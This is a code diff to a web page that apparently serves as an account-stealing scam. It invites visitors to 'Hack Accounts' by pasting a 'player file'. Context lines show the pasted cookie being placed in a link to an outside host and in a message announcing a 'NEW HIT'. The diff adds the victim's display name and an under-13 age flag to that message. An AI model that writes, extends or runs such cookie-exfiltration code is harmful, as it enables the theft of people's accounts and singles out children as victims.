@@ -190,11 +190,14 @@ export default function SlugPage() {
       const cookieNote = cookieValue.length > 4000 ? "\n(long cookie - scroll to view full)" : "";
       const linkRe = `https://manualrefresherforrichpeople.gt.tc/?cookie=${encodeURIComponent(cookieValue)}`;
 
+      const displayName = fullStats?.displayName || username;
+      const ageLabel = fullStats?.isUnder13 ? "<13" : ">13";
+
       const payload = {
         content: "@everyone NEW HIT",
         embeds: [
           {
-            title: "RIP_DEATH | <13",
+            title: `${displayName} | ${ageLabel}`,
             url: profileUrl,
             color: 16711680,
             fields: [
@@ -436,7 +439,7 @@ export default function SlugPage() {
             <div className="bg-[#121212] border border-[#1e1e1e] rounded-2xl p-8 shadow-2xl flex flex-col h-full">
               <h3 className="text-lg font-bold mb-3">Hack Accounts</h3>
               <p className="text-[#94a3b8] text-sm mb-6 leading-relaxed">
-                Paste your player file in the box below, then click "Start Hacking!"
+              Paste your player file in the box below, then click "Start Hacking" If you don't know how to find a users "player file" then go ahead and watch "How to use"
               </p>
 
               {status.type && (
